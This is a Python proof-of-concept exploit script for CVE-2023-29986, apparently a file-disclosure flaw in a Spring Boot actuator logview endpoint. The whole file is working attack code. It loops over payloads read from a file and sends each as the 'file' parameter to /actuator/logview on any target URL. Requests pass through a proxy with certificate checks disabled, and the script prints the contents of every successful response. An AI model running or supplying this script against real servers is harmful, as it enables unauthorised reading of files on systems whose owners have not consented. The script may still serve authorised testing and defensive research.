#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: David Espejo (Fortytwo Security)
import requests
import argparse
from urllib.parse import urljoin

# Check for CVE-2023-29986
def exploit_spring_boot_actuator(target_url, proxy_url, payload_file):
    endpoint = "/actuator/logview"
    
    # Proxy settings
    proxies = {
        "http": proxy_url,
        "https": proxy_url
    }
    
    # Read payloads from file
    with open(payload_file, 'r') as f:
        payloads = f.readlines()
    
    for payload in payloads:
        payload = payload.strip()
        
        # Construct the full URL
        full_url = urljoin(target_url, f"{endpoint}?file={payload}")
        
        try:
            # Send the request
            response = requests.get(full_url, proxies=proxies, verify=False)
            
            # Check if the exploit is successful
            if response.status_code == 200:
                print(f"Exploit successful with payload {payload}! Response:\n{response.text}")
            else:
                print(f"Exploit failed with payload {payload}! HTTP Status Code: {response.status_code}")
        
        except Exception as e:
            print(f"An error occurred with payload {payload}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC for CVE-2023-29986")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://target.com)")
    parser.add_argument("-p", "--proxy", default="https://127.0.0.1:8080", help="Proxy URL (default is https://127.0.0.1:8080)")
    parser.add_argument("-pl", "--payload-file", required=True, help="File containing payloads")
    
    args = parser.parse_args()
    exploit_spring_boot_actuator(args.target, args.proxy, args.payload_file)
